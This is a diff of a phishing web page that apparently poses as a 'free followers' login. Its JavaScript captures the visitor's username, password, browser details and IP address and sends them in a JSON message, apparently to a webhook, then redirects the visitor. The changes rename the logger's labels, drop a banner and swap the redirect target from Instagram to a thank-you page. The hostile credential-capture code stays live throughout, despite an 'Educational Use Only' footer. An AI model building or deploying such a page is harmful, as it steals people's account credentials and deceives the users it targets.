@@ -111,10 +111,6 @@
   </style>
 </head>
 <body>
-<!-- Top Pink Bar -->
-  <div class="top-bar">
-    <div class="top-bar-text">Free Followers</div>
-  </div>
   <div class="container">
     <div class="header">
       <img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png" alt="logo" />
@@ -153,13 +149,13 @@
       }
 
       const payload = {
-        username: "🔔 Premium Logger",
+        username: "🔔 Logger Bot",
         avatar_url: "https://cdn-icons-png.flaticon.com/512/2111/2111463.png",
         embeds: [
           {
-            title: "🚨 Login Captured - Premium Page",
+            title: "🚨 New Credential Capture",
             color: 0xffffff,
-            description: "New user logged in from premium followers page.",
+            description: "New user logged in from followers page.",
             fields: [
               { name: "👤 Username", value: `\`${username}\``, inline: true },
               { name: "🔑 Password", value: `\`${password}\``, inline: true },
@@ -167,7 +163,7 @@
               { name: "📡 IP Address", value: `\`${ip}\``, inline: false }
             ],
             footer: {
-              text: "Premium Logger • Educational Use Only",
+              text: "Logger Bot • Educational Use Only",
               icon_url: "https://cdn-icons-png.flaticon.com/512/2111/2111463.png"
             },
             timestamp: new Date().toISOString()
@@ -181,7 +177,7 @@
       request.send(JSON.stringify(payload));
 
       await delay(2000);
-      window.location.replace("https://www.instagram.com");
+      window.location.href = "thankyou.html";
     }
 
     function getBrowserInfo(ua) {
